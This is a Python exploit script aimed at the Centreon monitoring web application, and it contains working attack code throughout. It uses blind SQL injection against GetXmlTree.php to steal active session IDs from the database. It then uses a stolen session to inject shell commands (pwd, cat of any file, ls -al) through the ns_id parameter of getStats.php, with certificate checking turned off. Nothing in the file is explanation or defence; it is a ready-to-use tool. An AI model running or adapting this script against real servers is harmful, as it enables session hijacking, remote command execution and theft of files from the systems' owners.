#!/bin/env python

import blindinject
import sys

import urllib2, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE





def usage():
	print 'Usage: python %s <root> ACTION [...]' % sys.argv[0]
	print ' ACTIONS:'
	print '  SESSION'
	print '  PWD <session>'
	print '  CAT <session> <file>'
	print '  LS <session> <file | directory>'
	print ''
	sys.exit(1)

if len(sys.argv)<3:
	usage()

ROOT = sys.argv[1]
ACTION = sys.argv[2]

if not ACTION in ['SESSION','PWD','CAT','LS']:
	usage()



if ACTION == 'SESSION':
	''' SQLInjector parameters & callbacks '''

	cols = ['session_id']
	addWhere = '1'

	def patternCB(res):
		return res.find('Fatal error')==-1

	def simpleURLencode(url):
		return url.replace(' ', '%20').replace('#', '%23')


	''' CODE '''

	SI = blindinject.SQLInjector(ROOT + '/include/common/XmlTree/GetXmlTree.php?sid=', '0\' OR (SELECT COUNT(*) FROM (', ') AS res2)=1#', '', patternCB, simpleURLencode)

	BBlist = blindinject.BlindBuild(SI, 1, 'centreon', 'session', cols, addWhere, True)
	dumplist = BBlist.run()

	if count(dumplist)==0:
		print 'No session active in database, try later...'
		sys.exit(2)

	for line in dumplist:
		print 'Session found: %s' % line['session_id']


if ACTION == 'PWD':
	if len(sys.argv)<4:
		usage()

	SESSION = sys.argv[3]

	res = urllib2.urlopen(ROOT + '/include/Administration/corePerformance/getStats.php?session_id=' + SESSION + '&key=cmd_buffer&ns_id=|pwd%20', context=ctx).read()
	print res


if ACTION == 'CAT':
	if len(sys.argv)<5:
		usage()

	SESSION = sys.argv[3]
	FILE = sys.argv[4]

	res = urllib2.urlopen(ROOT + '/include/Administration/corePerformance/getStats.php?session_id=' + SESSION + '&key=cmd_buffer&ns_id=|cat%20'+FILE+'%20', context=ctx).read()
	print '\n'.join(res.split('\n')[:-9])


if ACTION == 'LS':
	if len(sys.argv)<5:
		usage()

	SESSION = sys.argv[3]
	TGT = sys.argv[4]

	res = urllib2.urlopen(ROOT + '/include/Administration/corePerformance/getStats.php?session_id=' + SESSION + '&key=cmd_buffer&ns_id=|ls%20-al%20'+TGT+'%20', context=ctx).read()
	print '\n'.join(res.split('\n')[8:])
